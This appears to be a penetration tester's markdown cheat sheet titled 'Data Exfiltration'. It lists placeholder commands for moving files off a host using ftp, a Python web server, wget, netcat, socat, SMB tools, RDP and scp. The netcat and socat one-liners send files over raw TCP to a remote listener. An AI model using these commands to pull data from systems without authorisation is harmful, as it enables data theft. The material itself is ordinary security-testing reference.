# Data Exfiltration  

## ftp  
`ftp [FTP SERVER ADDRESS] or ftp`  
`open    - connect to an ftp server`  
`user    - enter ftp username`  
`pass    - enter ftp password`  
`bi      - binary file transfer mode`  
`hash    - enable file transfer status`  
`get     - download a file`  
`put     - upload a file`  
`mget    - download multiple files`  
`mput    - upload multiple files`  
`prompt  - enable/disable interaction (disable if downloading multiple files)`

## http  
Using Python3 to run a temporary web server to allow file downloads from the current directory:  
`$ sudo python3 -m http.server [port]`  

Using wget 
`$ wget <url> -o <destinationfile>`

## netcat
source sends the file  
source: `$nc -w 3 <DESTINATION> <PORT> < FILENAME>`  
destination: `$nc -l -p <PORT> > <FILENAME>`

destination pulls file
source: `$nc -l -p <PORT> < <FILENAME>`
destination: `$nc -w 3 <SOURCE> <PORT> > <FILENAME>`    

## rdp  
if RDP is available on the system, connect and copy/paste between the rdp client and the desktop.  This has a 2GB file size limit.  For larger file transfers, [mount a local drive](https://helpdeskgeek.com/networking/accessing-local-files-and-folders-on-remote-desktop-session/)  

 
## smb/windows file sharing  
Using smbserver.py  
smbserver.py is a python script that will create an open share in a folder of choice.  Once running, you can browse and interact through it using regular windows file sharing tools, such as Windows Explorer.  
`$ sudo smbserver.py <SHARE NAME> <LOCAL FOLDER>`  

Using cifs-utils to mount an smb share  
`$ sudo mkdir /mnt/<LOCAL FOLDER>`  
`$ sudo mount -t cifs -o username=<SHARE USER>,domain=<WINDOWS DOMAIN> //<SHARE IP>/<SHARE NAME> /mnt/<LOCAL FOLDER>`  

Using smbclient cli:  
`$ sudo smbclient \\\\<HOSTNAME>\\<SHARE>`  

In the cli:  
`cd    - change remote directory`  
`dir   - list directory`  
`get   - download file (file will be downloaded to local directory)`  
`put   - upload file (file will be uploaded to remote directory)`  
`help  - help menu`  
`exit  - exits the cli`  

Copying files from the Windows command line:  
using drive letters  
`net use <DRIVE LETTER>: \\<SMBSHARE>`  
`copy <DRIVE LETTER\SOURCE> <DRIVE LETTER\DESTINATION>`  
  
without drive letters  
`xcopy <\\HOST\SOURCE> <\\HOST\DESTINATION>`  

## ssh/scp  
`$ scp <USER>@<SOURCEHOST>:<\DIRECTORY\FILE> <USER>@<DESTINATIONHOST>:<\DIRECTORY\FILE>`  

## socat  
source: `socat FILE:<FILENAME> TCP-LISTEN:<PORT>`  
destination:  `socat TCP:<HOST>:<PORT> FILE:<FILENAME>,create`  





